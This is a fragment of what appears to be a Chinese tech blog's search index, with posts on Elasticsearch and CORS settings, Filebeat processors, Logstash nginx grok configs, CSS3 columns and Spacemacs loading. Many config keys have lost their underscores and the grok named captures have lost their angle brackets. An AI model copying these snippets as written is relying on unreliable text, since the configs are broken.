2\n添加删除节点或负载均衡时并发恢复线程的个数，默认为4。\n\nindices.recovery.maxsizepersec: 0\n设置数据恢复时限制的带宽，如入100mb，默认为0，即无限制。\n\nindices.recovery.concurrentstreams: 5\n设置这个参数来限制从其它分片恢复数据时最大同时打开并发流的个数，默认为5。\n\ndiscovery.zen.minimummaster_nodes: 1\n设置这个参数来保证集群中的节点可以知道其它N个有master资格的节点。默认为1，对于大的集群来说，可以设置大一点的值（2-4）\n\ndiscovery.zen.ping.timeout: 3s\n设置集群中自动发现其它节点时ping连接超时时间，默认为3秒，对于比较差的网络环境可以高点的值来防止自动发现时出错。\n\ndiscovery.zen.ping.multicast.enabled: false\n设置是否打开多播发现节点，默认是true。\n\ndiscovery.zen.ping.unicast.hosts: [\"host1\", \"host2:port\", \"host3[portX-portY]\"]\n设置集群中master节点的初始列表，可以通过这些节点来自动发现新加入集群的节点。\n\n 基本操作\n\n设置集群中master节点的初始列表，可以通过这些节点来自动发现新加入集群的节点。","tags":null},{"location":"//blog.pytool.com/Reship/2015-03-04-how-to-choose-responsive-images-solution","title":"如何选择响应式图片解决方案","text":"如果你已经走上了响应式设计之路，那么你肯定需要一个响应式图片解决方案。\n\n响应式设计基本知识很容易学，但是当你掌握了它们，就会发现缩放图片只是个开始--你需要解决性能、艺术设计问题等等。你会发现有许多可选的响应式图片解决方案，它们各有千秋，但没有一个是完美的。\n\n本文将从最基本的说起，然后\n最基本的\n让图片适应容器的宽度是非常简单的。在你的normalize 或是 reset 样式表里，加入下面这条\n\n    img {\n        max-width: 100%;\n    }\n\n在大多数情况下，这条简单的规则就够了。当容器的宽度小于图片的宽度时，图片会缩放到与容器宽度一致。将max-width设为100%还保证了图片不会被拉伸，也就不会变模糊。如果你还要兼顾到IE6、7的话，那么你就需要给这些浏览器添加width:100%，因为它们不支持max-width。\n\n高分辨率的retina屏会使这个最基本的实现方式有些问题。假设你想让你的150px  150px的logo在retina屏显示双倍像素。所以，你创建了一个300px  300px版本的logo，但是现在logo太大了。你第一反应可能是增加下面的样式：\n\n    img.sitelogo {\n        max-width: 150px;\n    }\n\n非常不幸，这样的话，logo的图片就不会像其他图片一样友好的自适应了。\n\n要想限制这类图片的最大宽度，你只能通过限制图片容器的最大宽度，而不是图片本身。假设你用一个class为branding的标签包裹住logo图片，你只需添加下面的样式就ok了：\n\n    .branding {\n        max-width: 150px;\n    }\n\n现在我们可以在流体布局的网页中使用响应式图片了。任务完成，终于可以出去晒晒太阳了。\n\n别着急，还有两个问题需要我们解决。\n\n性能问题\n\n上面提到的响应式图片解决方案，所有设备都是用相同的通篇。小图标和logo也许还好，但是对于那些大图片而言，问题就比较严重了。retina的出现使问题更加的棘手，你肯定不会想给那些不能显示那么多细节的显示提供retina高清大图。\n\n更进一步：浏览器预加载\n\n带宽检测\n\n“艺术指导”问题\n\n如何选择\n\n幸运的是，前端和设计社区并不缺乏创造力。\n\n需要考虑的因素：\n\n是否需要解决“艺术指导”问题（例如：不同的图片比率，在不同宽度时裁剪和）\n你的网站是否特别大\n\n行之有效的响应式图片解决方案\n\nPICTUREFILL\n\nHISRC\n\nADAPTIVE IMAGES\n\nSENCHA.IO SRC\n\n有待观察的响应式图片解决方案\n\nCAPTURING/MOBIFY.JS 2.0\n\nRESRC.IT\n\n测试\n\nYSLOW\n\nWEBPAGETEST\n\n结论","tags":null},{"location":"//blog.pytool.com/Post/Elastic/beats/2016-10-04 libbeat过滤器processor","title":"filebeat 过滤器","text":"数据过滤有两个地方\n在 prospectors中 通过 includelines, excludelines, and excludefiles.\n\nfilebeat.prospectors:\ninputtype: log\n  paths:\n    /var/log/myapp/.log\n  includelines: [\"^ERR\", \"^WARN\"]\n在 processors 中通过事件过滤器(管道) 目前支持5种addcloudmetadata decodejsonfields dropevent dropfields includefields\n\n在数据输出之前可以通过libbeat提供的processor预处理\n每一个processors其接受一个事件event 处理后返回一个时间event\nevent -  processor 1 -  event1 -  processor 2 -  event2 ...\n\naddcloudmetadata\n\n 1.丢弃信息 dropevent   \n丢弃 DBG 开头的信息\nprocessors:\n dropevent:\n     when:\n        regexp:\n           message: \"^DBG:\"\n丢弃 包含test的信息\nprocessors:\ndropevent:\n    when:\n       contains:\n          source: \"test\"\n2.解码json decodejsonfields\nprocessors:\n decodejsonfields:\n     fields: [\"field1\", \"field2\", ...]  解码字段\n     processarray: false              # 数组是否解码 默认:false\n     maxdepth: 1                      # 解码深度\n     target:            \n     overwritekeys: false             # 覆盖字段  默认:false\n\n3. 丢弃字段 dropfields\n注:@timestamp 和 type 字段 不论添不添加都不会删掉\n  processors:\n dropfields:\n     when:\n        condition\n     fields: [\"field1\", \"field2\", ...]\n  4. 包含字段include_fields\n\nApache2 Fields\nAuditd Fields\nBeat Fields\nCloud Provider Metadata Fields\nLog File Content Fields\nMySQL Fields\nNginx Fields\nSystem Fields\n\n条件判断 conditions\n 1. 相等\nequals:\n  http.response.code: 200\n\n2. 包含  contains condition checks if a value is part of a field.\n  fields 可以是string 或 array ; value必须是sting\ncontains:\n  status: \"Specific error\"  \n 3. 正则匹配\n    regexp:\n      system.process.name: \"foo.\"\n4. 范围匹配\nrange:\n    http.response.code:\n        gte: 400\nrange:\n    http.response.code.gte: 400\n  0.5 \u003c system.cpu.use \u003c 0.8\nrange:\n    system.cpu.user.pct.gte: 0.5\n    system.cpu.user.pct.lt: 0.8    \n 5. 与\nand:\n  equals:\n      http.response.code: 200\n  equals:\n      status: OK\n6. 或\nor:\n  equals:\n      http.response.code: 304\n  equals:\n      http.response.code: 404\n 7. 非\nnot:\n  equals:\n    status: OK","tags":null},{"location":"//blog.pytool.com/Post/Elastic/ElasticSearch/2016-10-04  ElasticSearch——跨域访问","title":"ElasticSearch——跨域访问","text":"跨域请求：\n\nES服务器安装部署成功之后\n\n从另外一个域的浏览器访问ES服务器数据，会出现跨域的问题。\n\n抛出错误：No 'Access-Control-Allow-Origin' header is present on the requested resource. Origin 'null' is therefore not allowed access. The response had HTTP status code 503.\n\n查看ES相关资料，得知ES默认是不允许跨域的\n\n但是我们可以通过ES的配置文件：elasticsearch.yml中添加如下参数：\n\n    #开启跨域访问支持，默认为false  \n\n    http.cors.enabled: true  \n\n    #跨域访问允许的域名地址，(允许所有域名)以上使用正则  \n\n    http.cors.allow-origin: /./   \n\n通过以上配置，并重新启动ES服务器，就可以自由访问ES服务器\n\n但是允许访问的域名地址为“  “是高风险的，这说明部署的ES实例允许被任何地方跨域请求。\n\n因此实际使用最好根据需求设定允许访问的域名地址。\n\nES请求cache：false\n\n修改好配置文件并重启ES，再次查询，却发现又抛出另一个错误。\n\n错误代码如下：\n\n    {  \n        \"error\": {  \n            \"rootcause\": [  \n                {  \n                    \"type\": \"illegalargumentexception\",  \n                    \"reason\": \"request [/myindex/mytype/search] contains unrecognized parameter: []\"  \n                }  \n            ],  \n            \"type\": \"illegalargumentexception\",  \n            \"reason\": \"request [/myindex/mytype/search] contains unrecognized parameter: []\"  \n        },  \n        \"status\": 400  \n    }  \n\nJS请求代码如下：\n\n    script  \n      $.ajax({  \n        url: \"http://192.18.1.12:9222/myindex/mytype/search\",  \n        type: \"get\",  \n        data: { size: 0 },  \n        cache: false,  \n        success: function (result) {  \n          console.log(result);  \n        },  \n        error: function (err) {  \n          console.log(err);  \n        }  \n      });  \n\n    /script  \n\n请求的参数中，并没有   这个参数。\n\n这是怎么回事呢？\n\n查证之后,原来这是jQuery 的ajax cache选项的处理方式\n\n其处理方式如下：\n\n[javascript] view plain copy\nprint?\n\n    if ( s.cache === false \u0026\u0026 s.type.toLowerCase() == \"get\" )    \n        s.data = (s.data ? s.data + \"\u0026\" : \"\") + \"=\" + (new Date()).getTime();    \n\n如果不缓存的话，就在请求的url的data上添加一个时间戳，这样就不会缓存数据了，因为每次请求的url都不一样。\n\n但是这里是直接请求的ES的resultful API ，其并不会忽略参数\"\",而且还验证每个参数是否合法，这里就会报错。\n\n所以去掉对缓存的配置 cache：false，默认的cache配置为true。\n\n    $.ajax({  \n       url: \"http://192.18.1.12:9222/myindex/mytype/search\",  \n       type: \"get\",  \n       data: { size: 0 },  \n       success: function (result) {  \n         console.log(result);  \n       },  \n       error: function (err) {  \n         console.log(err);  \n       }  \n     });  \n\n再次执行查询，正确返回预期的结果。\n\n当然也可以直接在浏览器输入地址查询，也能够正确返回。","tags":null},{"location":"//blog.pytool.com/Post/Elastic/Logstash/2016-10-04 logstash nginx","title":"logstash nginx","text":"nginxlogformataccess\n\n'$remoteaddr [$timelocal] $status '\n  '\"$request\" $bodybytessent \"$httpreferer\" '\n'\"$httpuseragent\" \"$upstreamaddr\" \"$proxyaddxforwardedfor\" \"$requesttime\"'\n\ninput {\n  file {\n      type =  \"nginx-access\"\n      path =  \"/var/log/nginx/access.log\"\n  }\n  file {\n      type =  \"nginx-error\"\n      path =  \"/var/log/nginx/error.log\"\n  }\n}\n\nfilter {\n  if [type] == \"nginx-access\" {\n    grok {\n        match =  { \"message\" =  \"(?:%{SYSLOGTIMESTAMP}) ?%{SYSLOGHOST:logsource} %{SYSLOGPROG}: ?%{IPORHOST:clientip} \\[%{HTTPDATE:timestamp}\\] %{NUMBER:response} \\\"%{WORD:method} %{URIPATHPARAM:request} HTTP/%{NUMBER:httpversion}\\\" (?:%{NUMBER:bytes}|-) (?:\\\"(?:%{URI:referrer}|-)\\\"|%{QS:referrer}) %{QS:agent} %{QS:xforwardedip} %{QS:xforwardedfor} %{QS:responstime}\"}\n    }\n  }\n  if [type] == \"nginx-error\" {\n    grok {\n      match =  { \"message\" =  \"(?:%{SYSLOGTIMESTAMP}) ?%{SYSLOGHOST:logsource} %{SYSLOGPROG}: (?timestamp\\d{4}/\\d{2}/\\d{2} \\d{2}:\\d{2}:\\d{2}) \\[%{DATA:severity}\\] %{NOTSPACE} %{NOTSPACE} (?message(.|\\r|\\n))(?:, client: (?clientip%{IP}|%{HOSTNAME}))(?:, server: %{IPORHOST:server})(?:, request: %{QS:request})?(?:, host: %{QS:host})?(?:, referrer: \\\"%{URI:referrer})?\"}\n    }\n  }\n}\n\noutput {\n  if [type] == \"nginx-access\"{\n    elasticsearch {\n      hosts =  \"120.92.36.21:9200\"\n      template =  \"/etc/logstash/templates.d/access.json\"\n      templatename =  \"access\"\n      managetemplate =  true\n      templateoverwrite =  true\n      index =  \"access-%{+YYYY.MM.dd}\"\n    }\n  }\n  if [type] == \"nginx-error\"{\n    elasticsearch {\n      hosts =  \"120.92.36.21:9200\"\n      template =  \"/etc/logstash/templates.d/error.json\"\n      templatename =  \"error\"\n      managetemplate =  true\n      templateoverwrite =  true\n      index =  \"error-%{+YYYY.MM.dd}\"\n    }\n  }\n}\n\ninput {\n  file {\n      path =  \"/var/log/nginx/access.log\"\n      startposition =  beginning\n  }\n}\nfilter {\n  grok {\n      match =  { \"message\" =  \"(?:%{SYSLOGTIMESTAMP}) ?%{SYSLOGHOST:logsource} %{SYSLOGPROG}: ?%{IPORHOST:clientip} \\[%{HTTPDATE:timestamp}\\] %{NUMBER:response} \\\"%{WORD:method} %{URIPATHPARAM:request} HTTP/%{NUMBER:httpversion}\\\" (?:%{NUMBER:bytes}|-) (?:\\\"(?:%{URI:referrer}|-)\\\"|%{QS:referrer}) %{QS:agent} %{QS:xforwardedip} %{QS:xforwardedfor} %{QS:responstime}\"}\n  }\n}\noutput {\n  elasticsearch {\n      hosts =  \"120.92.36.21:9200\"\n      managetemplate =  true\n      index=  \"access-%{project}-%{+YYYY.MM.dd}\"\n  }\n}\n\ninput {\n  file {\n      path =  \"/var/log/nginx/sampleaccess.log\"\n      startposition =  beginning\n  }\n}\n\nfilter {\n  grok {\n    match =  { \"message\" =  \"(?:%{SYSLOGTIMESTAMP}) ?%{SYSLOGHOST:logsource} %{SYSLOGPROG}: ?%{IPORHOST:clientip} \\[%{HTTPDATE:timestamp}\\] %{NUMBER:response} \\\"%{WORD:method} %{URIPATHPARAM:request} HTTP/%{NUMBER:httpversion}\\\" (?:%{NUMBER:bytes}|-) (?:\\\"(?:%{URI:referrer}|-)\\\"|%{QS:referrer}) %{QS:agent} %{QS:xforwardedip} %{QS:xforwardedfor} %{QS:responstime}\"}\n   removefield =  [\"message\"]\n  }\n  if \"grokparsefailure\" in [tags] {\n    grok {\n      match =  {\"message\" =  \"%{GREEDYDATA}\"}\n      removetag =  [\"grokparsefailure\"]\n    }\n  }\n}\n\noutput {\n        elasticsearch {\n                hosts =  \"192.168.19.35:9200\"\n                template =  \"/etc/logstash/templates/access.json\"\n                templatename =  \"access\"\n                managetemplate =  true\n                templateoverwrite =  true\n                index =  \"access-%{+YYYY.MM.dd}\"\n        }\n}\n`","tags":null},{"location":"//blog.pytool.com/Post/前端技术/Web技术/掌握css3布局","title":"掌握css3布局","text":"掌握css3布局(带实例)(一) span class=\"type\"原创/span\n在传统的浮动、定位基础之上，CSS3提供了一系列新的布局方式，包括弹性盒模型、多列、媒体查询等，利用这些布局方式我们可以灵活地应对复杂网页布局，本文通过属性详解、实战案例的方式向您展示这些新兴布局方式的强大之处。\n\n1.弹性盒模型\n弹性盒布局模型（Flexible Box Layout）是 CSS3 规范中提出的一种新的布局方式。该布局模型的目的是提供一种更加高效的方式来对容器中的条目进行布局、对齐和分配空间。这种布局方式在条目尺寸未知或动态时也能工作。这种布局方式已经被主流浏览器所支持，可以在 Web 应用开发中使用。\n\n理解这个图(一)\")\n\n本人文笔有限,这里我推荐别人写得很好的教程。\n\nFlex 布局教程：语法篇\nFlex 布局教程：实例篇\n\n附带例子:\n\nflexbox实验场\nflexbox菜单项目实战\n\n2.多列属性\nCSS3中新出现的多列布局(multi-column)是传统HTML网页中块状布局模式的有力扩充。这种新语法能够让WEB开发人员轻松的让文本呈现多列显示。我们知道，当一行文字太长时，读者读起来就比较费劲，有可能读错行或读串行；人们的视点从文本的一端移到另一端、然后换到下一行的行首，如果眼球移动浮动过大，他们的注意力就会减退，容易读不下去。所以，为了最大效率的使用大屏幕显示器，页面设计中需要限制文本的宽度，让文本按多列呈现，就像报纸上的新闻排版一样。\n\n但是在CSS3的多列布局(columns)语法功能出现之前，人们如果想让文本呈多列显示，要么使用绝对定位，手动给文本分段落，或者使用JS脚本等，而新语法的出现，彻底改变了这样的局面。\n\n 多列(columns)的用法\n\n列个数 和 列宽度\n\n不管想让一段文本呈多少列显示，你需要的只是两个属性：column-count 和 column-width。\n\ncolumn-count 属性设置列的具体个数，例如：\n\ndiv style=\"column-count:2;\"\nCSS里一直有一个让我们头疼的问题，就是创建布局很麻烦。\n当然，有很多方式，有很多技术都可以创建各种布局，但我\n们总觉得CSS里应该提供一些新属性，让我们能更好的管理布局。\n幸运的是，CSS3里提供了一批新的创建列式布局的column属性，\n有了这些属性，我们不需要再使用float,clear,margin等属性进行\n调控，避免了很多麻烦。\n/div\n\n这将会使文本里的内容显示成两列(首先你的浏览器要支持这种新语法，比如火狐浏览器、谷歌浏览器，IE10+等)：\n\n(一)\")\n\ncolumn-width属性控制列的宽度。如果你没有提供column-count属性值，那么，浏览器就是自主决定将文本分成合适的列数。\n\ndiv style=\"column-width:10em;\"\nCSS里一直有一个让我们头疼的问题，就是创建布局很麻烦。\n当然，有很多方式，有很多技术都可以创建各种布局，但我\n们总觉得CSS里应该提供一些新属性，让我们能更好的管理布\n局。幸运的是，CSS3里提供了一批新的创建列式布局的column\n属性，有了这些属性，我们不需要再使用float,clear,margin\n等属性进行调控，避免了很多麻烦。/div\n\n就变成了这样：\n\n(一)\")\n\n 多列布局columns语法简写\n\n大多时候，WEB程序员只需要同时使用这两个属中的一个：column-count 或 column-width。或者两个同时使用，幸运的是，这两个属性的属性值是不同单位，不会搞混，所以就有了简写方式，columns，例如：\n\n我们之前写的 column-width:12em 可以用下面的写法替换：\n\ndiv style=\"columns:12em\"CSS里一直有一个让我们头疼的\n问题，就是创建布局很麻烦。当然，有很多方式，有很多技术\n都可以创建各种布局，但我们总觉得CSS里应该提供一些新属\n性，让我们能更好的管理布局。幸运的是，CSS3里提供了一批\n新的创建列式布局的column属性，有了这些属性，我们不需要\n再使用float,clear,margin等属性进行调控，避免了很多麻烦。\n/div\n\n而之前写的 column-count:4 可以用以下语法简写替换：\n\ndiv style=\"columns:4\"CSS里一直有一个让我们头疼的\n问题，就是创建布局很麻烦。当然，有很多方式，有很多\n技术都可以创建各种布局，但我们总觉得CSS里应该提供\n一些新属性，让我们能更好的管理布局。幸运的是，CSS3\n里提供了一批新的创建列式布局的column属性，有了这些\n属性，我们不需要再使用float,clear,margin等属性进行\n调控，避免了很多麻烦。\n/div\n\n而同时声明了 column-width:8em 和 column-count:12 的情况可以用以下简写替换：\n\ndiv style=\"columns:12 8em\"CSS里一直有一个让我们头疼的问题，就是\n创建布局很麻烦。当然，有很多方式，有很多技术都可以创建各种布局，但\n我们总觉得CSS里应该提供一些新属性，让我们能更好的管理布局。幸运的\n是，CSS3里提供了一批新的创建列式布局的column属性，有了这些属性，我\n们不需要再使用float,clear,margin等属性进行调控，避免了很多麻烦。/div\n\n列高度的平衡\n\nCSS3规范里描述的是，各列的高度是均衡的，浏览器会自动调整每列里填充多少文本、均分文本，来使各列的高度保持均衡一致。\n\n然而，有时候，我们需要设定列的最大高度，这个时候，文本内容会从第一列开始填充，然后第二列，第三列，也许以后的列会填不满，也许会溢出。所以，当对多列布局设定了height或max-height属性值后，列会伸长到指定高度——无论内容有多少，够不够或超不超。\n\n 列之间的缝隙间隔宽度\n\n两列之间会有缝隙间隔。缺省情况下这个间隔宽度是1em，但如果你使用column-gap属性，就会修改这个缺省的宽度值：\n\ndiv style=\"column-width:20em; column-gap:2em;\"\nCSS里一直有一个让我们头疼的问题，就是创建布局很麻烦。当然，\n有很多方式，有很多技术都可以创建各种布局，但我们总觉得CSS里\n应该提供一些新属性，让我们能更好的管理布局。幸运的是，CSS3里\n提供了一批新的创建列式布局的column属性，有了这些属性，我们不\n需要再使用float,clear,margin等属性进行调控，避免了很多麻烦。/div\n\n(一)\")\n\n列布局的浏览器完美兼容\n\n对于一些不支持多列布局特征的浏览器，比如IE9/IE8，会把这些属性全部忽略，这样布局就呈现出传统的单块布局。\n\n为了保证浏览器最大的兼容性，我们在使用多列布局属性时，最好添加浏览器引擎前缀，最基本的要加上三种：谷歌浏览器的-webkit-，火狐浏览器的-moz-，IE浏览器的-ms-，最后，别忘了不带前缀的写法。\n\n 总结\n\nCSS3的多列布局(columns)是一种方便WEB开发者高效利用宽屏显示器的非常有用的功能特征。你会发现在很多地方都需要用到它们，特别是需要自动平衡列高度的地方。\n\n这篇文章就介绍到这里,下篇文章讲解响应式布局中的核心内容媒体查询的基础用法和常见使用方式及实例。","tags":null},{"location":"//blog.pytool.com/Edit/2015-01-12 文本编辑 spacemacs 加载顺序","title":"spacemacs 加载顺序","text":"Spacemacs configuration layers - 小幻的博客 - 博客频道 - CSDN.NET\nSpacemas的Dotfile配置 - 小幻的博客 - 博客频道 - CSDN.NET\n特性： 自动加载Auto-loading\nemacs autoload 集装箱 · LinuxTOY\n(defun add-to-load-path (dir) (add-to-list 'load-path dir))\n(add-to-list 'exec-path \"~/.local/bin/\")\nSpacemacs 约定\nCode guidelines\n Spacemacs core and layer\n函数命名\n  =spacemacs/xxx= 命令函数\n  =spacemacs//xxx= 私有函数\n  =spacemacs|xxx= 宏\n\n变量命名规范\n  =spacemacs-xxx= 普通变量\n  =spacemacs--xxx= 私有变量\n\nlayer 命名规范\n(defun  layer/init-package ()\n  )\n\nzhexuany/.spacemacs.d\neggcaker/spacemacs-layers\nchrisbarrett/spacemacs-layers\n emacs配置加载顺序\n[~/.emacs|.emacs.el -  ~/.emacs.d/init.el] -  [.spacemacs -  .spacemacs.d/init.el]\n\n..spacemacs.d/init.el 文件加载顺序定义在~/.emacs.d/init.el -  .emacs.d/core/core-spacemacs.el中通过 dotspacemacs|call-func 宏实现调用。\n在这个文件中有四个顶级函数： dotspacemacs/init，dotspacemacs/user-init, dotspacemacs/layers, 和 dotspacemacs/user-config。\nDotspacemacs/init  函数是在启动过程中，在其他东西运行前运行，并且包含  Spacemacs  设置。 除非你需要更改默认 Spacemacs 设置，否则你不用动这个函数。\nDotspacemacs/user-init 函数也是在其他程序运行前运行，并包含用户特定配置。\ndotspacemacs/emacs-custom-settings\nDotspacemacs/layers 函数仅用于启用和禁用层和包 自定义层在此处加载\nDotspacemacs/user-config 最后加载，函数是你用到最多的函数。 在这里，你可以定义任何用户配置\nspacemacs 顶级函数之三 Dotspacemacs/layers\n\n(defun dotspacemacs/layers ()\n\n (setq-default dotspacemacs-configuration-layers\n   '(\n      ;; :packages            ;; 针对当前layer需要启用的package 默认全部启用\n      ;; :variables           ;; 配置当前layer 变量设置\n      ;; :disabled-for        ;; 指定layer中禁用\n      ;; :enabled-for         ;; 在指定layer中启用\n\n      (chinese :packages\n         :variables\n         ;;pangu-spacingchinese-enable-fcitx t\n         pangu-spacing-real-insert-separtor t ;;将空格加入 linux 到你的档案\n         ;;linux 或者有 fcitx-remote 才启用 fcitx 支持\n         chinese-enable-fcitx '(or (spacemacs/system-is-linux) (executable-find \"fcitx-remote\"))\n         chinese-enable-youdao-dict t)\n\n      (auto-completion :enabled-for java python)\n      (auto-completion :disabled-for org git)\n\n     )))\n\n Spacemacs layer创建自定义层layer\nconfiguration-layer/create-layer\n\nSpacemacs layer加载顺序\nlayers.el   declare additional layers\npackages.el the packages list and configuration\n        layer/pre-init-package\n        layer/init-package\n         use-package 一般在此处调用\n        layer/post-init-package\n        除非至少一个层为其定义了一个init函数，否则不会安装该包。 也就是说，在某种意义上，init函数是强制性设置，而pre-init和post-init函数做可选的设置。 这可以用于管理跨层依赖性，我们将在后面讨论。\nfuncs.el    all functions used in the layer should be declared here\nconfig.el   layer specific configuration\nkeybindings.el  general key bindings\n\n Spacemacs layer加载过程\n\n Spacemacs加载过程可以概括如下：\n\nSpacemacs经过所有启用层，并评估他们的文件。通过引入的变化config.el因此被应用，然后funcs.el和 packages.el被加载，但没有从发生packages.el，因为这些文件只定义函数和变量。\nSpacemacs检查该包应下载并安装。要安装一个程序包必须\nI layer配置package 以下4个条件必须都满足才可以\n在layer中声明，并且启用\n不能被其他层排除掉 =layer-excluded-packages=\n不能被自己排除掉 =layer-excluded-packages=.\n必须有至少一个layer/init-package为它定义的功能。\n\nincluded by a layer that the user has enabled,\nnot be excluded by any other layer that the user has enabled,\nnot be excluded by the user herself, and\nthere must be at least one layer/init-package function defined for it.\n\nII: 另外，如果一个包是最终用户的一部分 dotspacemacs-additional-packages，它也将被安装。\n\n加载所有的包，并按字母顺序排列 package.el内置的Emacs库负责隐含的依赖。不包含上述规则的包及其依赖将被删除。（是否移除依赖包是可选的，缺省值t）。\n的pre-init，init并且post-init为每个安装的包功能依次执行。\n\n  注意： 如果一个layer拥有一个包，仅仅只定义pre-init或post-init 函数 但是没有定义init函数，那么这个包并不会安装。\n所以 如果一个layer已经init了一个包，自定义的layer可以只定义 pre-init或post-init 去配置一个自定义的选项。\n 每一个包应该只在一个layer中初始化，在其他层配置\n  注意：\n\n1. layers.el\n移除layer\n(configuration-layer/remove-layer 'chinese)\n添加 其他layer\n(configuration-layer/declare-layers '(\n\n                                      ))\n\n 2. packages.el\n\nPackages.el 文件包含你可以在 layer-name-packages 变量中安装的包的列表。所有 MELPA 仓库中的包都可以添加到这个列表中。还可以使用 :excluded t 特性将包包含在列表中。每个包都需要一个函数来初始化。这个函数必须以这种模式命名：layer-name/init-package-name。这个函数包含了包的配置。同时还有一个 pre/post-init 函数来在包加载之前或之后运行代码。它看起来想这个样子：\n\n(defconst layer-name-packages '(example-package\n\n                            ;; :location built-in\n\n                            ;; :toggle 条件控制 当变量chinese-enable-fcitx为t时加载fcitx包\n                            (fcitx :toggle chinese-enable-fcitx)\n\n                            ;; :excluded 为真(t)来卸载example-package-2\n                            (example-package-2 :excluded t)))\n\n;; List of packages to exclude.\n(setq appleshan-core-excluded-packages '())  \n\n(defun layer-name/post-init-package ()\n  ;;在这里添加另一个层的包的配置\n  )\n(defun layer-name/init-example-package ()\n  ;;在这里配置example-package\n  )\n注意：只有一个层可以具有一个对于包的 init 函数。如果你想覆盖另一个层对一个包的配置，请使用 use-package hooks 中的 layer-name/pre-init 函数。\n\n如果 MELPA 中没有你想要的包，你必须是由一个本地包或一个包源。关于此的更多信息可以从层的剖析处获得。\n\n确保你添加了你的层到你的 .spacemacs 文件中，并重启 spacemacs 以激活。\n3. funcs.el\n 4. config.el\n声明一些可被外部配置的变量\n5. keybindings.el\n\n为了将配置分组或当配置与你的 .spacemacs 文件之间不匹配时，你可以创建一个配置层。Spacemacs 提供了一个内建命令用于生成层的样板文件：SPC :configuration-layer/create-layer。这条命令将会生成一个如下的文件夹：\n\n 依赖检查\nSpacemacs提供了一些可以用来检查是否包括其他层或包的其他有用的功能。\n启用一个层\n对于需要启用另一个层，使用功能的层 configuration-layer/declare-layer及configuration-layer/declare-layers以确保即使用户没有使他们明确表示的层被启用。调用这些功能必须去的config.el文件。\n 检查是否启用了一个层\nconfiguration-layer/layer-usedp\n\n启用package\n\n即使在layer中激活了一个package，但是依然有可能会在其他层中excluded掉\n=layer-excluded-packages=.\n=dotspacemacs-excluded-packages=\n\n 检查包是否或将被安装\nconfiguration-layer/package-usedp\n\n(when (configuration-layer/layer-usedp 'chinese) # 当chinese层被启用时才执行以下配置\n\n这些是在某些情况下是有用的，但通常可以只通过使用获得所需的结果post-init的功能。\n\n关系整合\nuse-package 与 layer\nuse-package 与 require\nuse-package 与 autoload\nlayer 与 package\nrequire 与 load\n\n 加载\n\n注意，是加载，而不是激活。回忆下你是怎么使用Chrome的插件系统：安装插件，插件的图标出现在浏览器地址栏的右侧，点击插件的图标来使用插件（激活其功能），有的插件甚至默认激活。这个过程中，所有加载和初始化配置的工作都由软件自动完成，你唯一需要做的就是选择用不用（激活）而已。\n\n然而，elpa要求你自己完成加载和配置的步骤。一般来说，常见的载入命令有，require，load，autoload等。而所谓的配置就是初始化一些参数。\n\nemacs一般称“插件”为\"package\"或者\"library\"。本质上，它们都提供一堆定义好的函数，来实现一些操作，进而实现某个功能。这里多说几句。在emacs中，连移动光标这种最底层的操作都有对应的函数。比如，你在emacs中可以键入C-f来将光标向右移动一个字符，同时也可键入M-x forward-char来实现。任何复杂的功能，比如给文档生成一个目录，都可以被分解为一个个操作，或者说调用一个个函数，而这些函数顺序执行下来功能就得到了实现。\n\n当emacs想要加载某个插件时，归根到底需要定位并运行一个（也许是一些）脚本文件，那个脚本里定义了实现插件功能所需的变量和函数。emacs将它们转变为可供自己使用的对象（elisp object），放到运行环境中等待调用。而脚本自身还可以在内部进一步加载其他脚本。下面，来了解加载脚本的几个语句，load，require，load-file，autoload。\n参考Emacs Lisp's Library System: What's require, load, load-file, autoload, feature?\n延伸阅读 Required Feature\n参考Autoload\n延伸阅读\nFeatures TD\nHow Programs Do Loading TD\nLibraries of Lisp Code for Emacs TD\nByte Compilation TD\n\nFeature可以理解为“特色功能”，比如，你在苹果的App Store里查看应用程序简介时，一般都会看到一个以Features开头的段落。单数形式，feature，一般对应一个插件的名字，因为一般插件的名字直接表明它实现的功能。复数形式，features，是一个用来存储feature的列表，这个列表可以告诉emacs哪些插件经被加载了。一般情况下，一个插件的启动脚本的结尾会调用(provide 'symbol name)，将'symbol name加入到features中去。'symbol name一般就是插件的名字\nload一个位于硬盘上的文件，意味着执行这个文件里的所有elisp语句，然后将执行结果放进emacs的运行环境\n(require 'symbol name)会先查看features里面是否存在symbol name。如果存在，语句执行完毕。如果不存在，基于它来猜一个文件名，或者由require的第二个参数直接指定文件名，然后load文件。注意，load完成后，require函数会再一次查看features列表中是否存在'symbol name，如果发现还是不存在，视参数soft-flag来决定是否报错\nrequire 只不过是一种加载load-file的方法，它的意义在于避免重复加载。比如，某个插件的启动脚本中需要用到另一个插件提供的某个函数。那么它就会require这个插件，保证插件已被载入，然后再执行后续语句。\n\nload-file需要指定文件路径，\nload对load-file进行封装,不需要指定路径。会自动搜索load-path，\nrequire 只不过是一种加载load-file的方法，它确保文件以正确的顺序加载，并避免重复加载。在某种程度上解决了去哪里找到需要加载的文件的问题，但是过长的加载列表依然导致emacs加载起来很慢。所以采用autoload才是王道\nautoload在函数执行时再load指定文件 （该函数关联到指定el,当该函数被调用时再去加载运行指定文件）\n\n其实，连整个emacs的启动都可以概括为一句话：加载一系列脚本。只不过这些脚本有的是内置的（built in），有的是你安装的插件包含的，有的是你自己写的。\n\nautoload原理:\n首先当函数加载时，将函数定义为null,当调用时立即将函数替换为函数本身，并加载执行。所以也会带来微小的延时。\nautoload 主要用于 xxx-mode major模式中.\nautoload告诉emacs某个地方有一个定义好的函数，并且告诉emacs，先别加载，只要记住在调用这个函数时去哪里寻找它的定义即可\n这样做的一个好处是，避免在启动emacs时因为执行过多代码而效率低下，比如启动慢，卡系统等。想象一下，如果你安装了大量的有关python开发的插件，而某次打开emacs只是希望写点日记，你肯定不希望这些插件在启动时就被加载，让你白白等上几秒，也不希望这些插件在你做文本编辑时抢占系统资源（内存，CPU时间等）。所以，一个合理的配置应该是，当你打开某个python脚本，或者手动进入python的编辑模式时，才加载那些插件\n一个简单概括：“只注册函数名而不定义函数本身”\n\n前面介绍了几种加载机制。加载的目的在于定义变量和函数以供使用。任何插件，只有先被加载才能被使用。而且通常，你都希望先加载一个插件，再来配置它。考虑如下情景。\n\n你的插件中定义了一个变量a，默认值是1，插件内定义的许多函数都在内部使用了a。你希望在自己使用这些函数时，用到的a的值是2。有两种实现途径。一种是直接到插件的脚本文件中修改a的值为2。这叫做\"hard coding\"，有很多坏处。比如，每次更新插件，都要重新修改。另一种方法是，等这个插件已经被加载后，修改相应的elisp 